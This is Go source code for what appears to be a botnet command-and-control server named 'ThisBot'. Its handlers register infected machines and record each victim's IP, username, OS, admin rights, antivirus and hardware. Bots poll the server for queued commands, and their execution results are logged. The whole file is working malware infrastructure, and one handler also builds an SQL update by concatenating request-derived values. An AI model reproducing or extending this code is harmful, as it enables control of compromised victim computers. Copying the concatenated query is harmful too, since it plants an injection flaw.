package core

import (
	"ThisBot/common"
	"ThisBot/db1"
	"ThisBot/utils"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strconv"
)

func recovery_handler(w http.ResponseWriter, r *http.Request) {
	log.Println("recovery_handler triggered")

	guid := r.Header.Get("X-Guid")
	time1 := r.Header.Get("X-Time")

	// Read bot info
	var bot common.Client
	utils.ReadJson(r, &bot)

	reply := common.ServerReply{
		Args: make(map[string]any),
	}

	reply.Status = 1
	reply.TaskId = 0
	reply.Error = ""
	reply.Cmd = ""

	out_guid := ""
	out_token := ""
	strSql := "select guid, token from clients where guid=?"
	err := db1.QueryRow(common.Db, strSql, guid).Scan(&out_guid, &out_token)
	if err == sql.ErrNoRows {
		fmt.Print("[🧟] Bot[" + guid + "] join\n$ ")
		// No such bot, create bot
		strSql = "insert into clients (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, status) values(?,?,?,?,?,?,?,?,?,?,?,?,?)"
		// Generate new token
		out_token = common.Base64Enc(utils.GenerateRandomBytes(32))
		_, err = db1.Insert(common.Db, strSql, guid, out_token, bot.Ip, bot.Whoami, bot.Os, utils.TimestampStringToMySqlDateTime(bot.Installdate), bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, utils.TimestampStringToMySqlDateTime(time1), "active")
		if err != nil {
			// Failed to create a bot
			reply.Status = 0
			reply.Error = "No such bot and failed to create new bot"
		} else {
			// Create bot okay
			reply.Args["Token"] = out_token
		}
	} else if err != nil {
		reply.Status = 0
		reply.Error = "Unknown error"
		log.Println(err.Error())
	} else {
		// Find the bot
		fmt.Print("[🧟] Bot[" + guid + "] online\n$ ")
		reply.Args["Token"] = out_token
		tx, _ := common.Db.Begin()
		// Update timestamp lastseen
		strSql = "update clients set token=?,ip=?,whoami=?,os=?,installdate=?,isadmin=?,antivirus=?,cpuinfo=?,gpuinfo=?,clientversion=?,lastseen=?,status=? where guid=?"
		_, err = tx.Exec(strSql, out_token, bot.Ip, bot.Whoami, bot.Os, utils.TimestampStringToMySqlDateTime(bot.Installdate), bot.Isadmin, bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, utils.TimestampStringToMySqlDateTime(time1), "active", out_guid)
		if err != nil {
			tx.Rollback()
			reply.Status = 0
			reply.Error = "Find the bot but failed to update"
			log.Println(err.Error())
		}
		// Delete record in clients_archived
		strSql = "delete from clients_archived where guid=?"
		_, err = tx.Exec(strSql, guid)
		if err != nil {
			tx.Rollback()
			reply.Status = 0
			reply.Error = "Find the bot but failed to update"
			log.Println(err.Error())
		}
		tx.Commit()
	}

	err = http_sender(w, guid, out_token, &reply)
	if err != nil {
		log.Println(err.Error())
	}
}

func poll_handler(w http.ResponseWriter, r *http.Request) {
	log.Println("poll_handler triggered")
	guid := r.Header.Get("X-Guid")
	time1 := r.Header.Get("X-Time")
	sign := r.Header.Get("X-Sign")

	// Find bot in clients
	var saved_guid string
	var saved_token string
	var saved_lastseen string
	var saved_botid int
	reply := common.ServerReply{
		Args: make(map[string]any),
	}

	reply.Cmd = ""
	reply.Error = ""
	reply.Status = 1
	reply.TaskId = 0

	var sqlStr string
	// Clients_archived
	tx, err := common.Db.Begin()
	if err != nil {
		log.Println("tx begin err:", err.Error())
		goto ReadyPoll
	}
	// Update the status of clients and clients_archived
	sqlStr = "update clients set status='active', lastseen=? where guid=?"
	_, err = db1.Exec(common.Db, sqlStr, utils.TimestampStringToMySqlDateTime(time1), guid)
	if err != nil {
		log.Println("db1.Exec err: ", err.Error())
	}
	//sqlStr = "insert into clients(guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, status) " +
	//	"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen, 'active' from clients_archived where guid=?"
	//_, err = tx.Exec(sqlStr, guid)
	//if err != nil {`
	//	tx.Rollback()
	//	log.Println("tx insert err:", err.Error())
	//	goto ReadyPoll
	//}
	sqlStr = "delete from clients_archived where guid=?"
	_, err = tx.Exec(sqlStr, guid)
	if err != nil {
		tx.Rollback()
		log.Println("tx delete err:", err.Error())
		goto ReadyPoll
	}
	if err = tx.Commit(); err != nil {
		log.Println("tx commit err:", err.Error())
	}

ReadyPoll:
	sqlStr = "select id, guid, token, lastseen from clients where guid=?"
	err = db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_botid, &saved_guid, &saved_token, &saved_lastseen)
	if err == sql.ErrNoRows {
		// Can't find bot
		log.Println("can't find bot in poll handler" + err.Error())
		reply.Cmd = "register"
		reply.Status = 0
		reply.Error = "can't find bot in poll handler"
	} else if err != nil {
		log.Println(err.Error())
		reply.Status = 0
		reply.Error = "Unknown error"
		reply.Cmd = "register"
	} else {
		// Find it!
		if !check_package_legality(guid, saved_token, sign, time1) {
			reply.Status = 0
			reply.Error = "Illegal package"
			reply.Cmd = "poll"
		} else {
			sqlStr = "select t.id as task_id, c.name, t.args" +
				" from tasks t join commands c on t.command_id = c.id" +
				" where t.bot_id = ? and t.status = 'queued' order by t.created_at asc limit 1"
			saved_id := 0
			saved_command := ""
			var saved_args map[string]any
			var bytes_args []byte
			err = db1.QueryRow(common.Db, sqlStr, saved_botid).Scan(&saved_id, &saved_command, &bytes_args)
			if err == sql.ErrNoRows {
				// No such task
				reply.Cmd = "poll"
				reply.Status = 0
				reply.Error = "Can't find task"
			} else if err != nil {
				// Error in finding task
				reply.Status = 0
				reply.Error = "Unknown error"
				reply.Cmd = "register"
			} else {
				json.Unmarshal(bytes_args, &saved_args)
				// Update the status of task to running
				sqlStr = "update tasks set status='running' where id=?"
				_, err := db1.Exec(common.Db, sqlStr, saved_id)
				if err != nil {
					reply.Cmd = "poll"
					reply.Error = "Can't update task status"
					reply.TaskId = int64(saved_id)
					fmt.Println("[💀] Failed to update status when execute task id = " + strconv.FormatInt(int64(saved_id), 10))
				} else {
					// Find the command of task and send to bot
					reply.Cmd = saved_command
					reply.Args = saved_args
					reply.TaskId = int64(saved_id)
				}
			}
		}
	}
	err = http_sender(w, guid, saved_token, &reply)
	if err != nil {
		log.Println(err.Error())
	}
}

func logout_handler(w http.ResponseWriter, r *http.Request) {

}

func login_handler(w http.ResponseWriter, r *http.Request) {

}

func report_handler(w http.ResponseWriter, r *http.Request) {
	log.Println("report_handler triggered")

	guid := r.Header.Get("X-Guid")
	time1 := r.Header.Get("X-Time")
	sign := r.Header.Get("X-Sign")

	// Check if the bot exists
	saved_token := ""
	saved_id := 0
	saved_ip := ""
	sqlStr := "select id, token, ip from clients where guid=?"
	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_id, &saved_token, &saved_ip)
	if err == sql.ErrNoRows {
		fmt.Println("[💀] Can't find bot in report hander")
		return
	} else if err != nil {
		fmt.Println("[💀] Unknown error")
		return
	}
	// Check legality of the package
	if !check_package_legality(guid, saved_token, sign, time1) {
		fmt.Println("[💀] Illegal package")
		return
	}

	// Parse the report
	var report common.Report
	err = json.NewDecoder(r.Body).Decode(&report)
	if err != nil {
		fmt.Println("[💀] Failed to read the report")
		return
	}
	defer r.Body.Close()
	// Find the task and update it's status
	status := "done"
	if !report.Success {
		status = "failed"
	}

	sqlStr = "update tasks set status='" + status + "',completed_at='" + utils.TimestampStringToMySqlDateTime(time1) + "' where id=?"
	_, err = db1.Exec(common.Db, sqlStr, report.TaskID)
	if err != nil {
		log.Printf("[💀] Failed to update task[%s] status\n", report.TaskID)
		return
	}

	// Add log to database
	action := report.Extra["action"].(string)
	sqlStr = "insert into logs(account_id, action, client_id, message, status, ip, task_id) values(?,?,?,?,?,?,?)"
	saved_task_id_int, _ := strconv.ParseInt(report.TaskID, 10, 64)
	_, err = db1.Insert(common.Db, sqlStr, common.Account, action, saved_id, report.Output, report.Error, saved_ip, saved_task_id_int)
	if err != nil {
		log.Printf("[💀] Failed to add task[%s] log\n", report.TaskID)
		return
	}
	fmt.Print("[✅] New task log generated\n$ ")
}
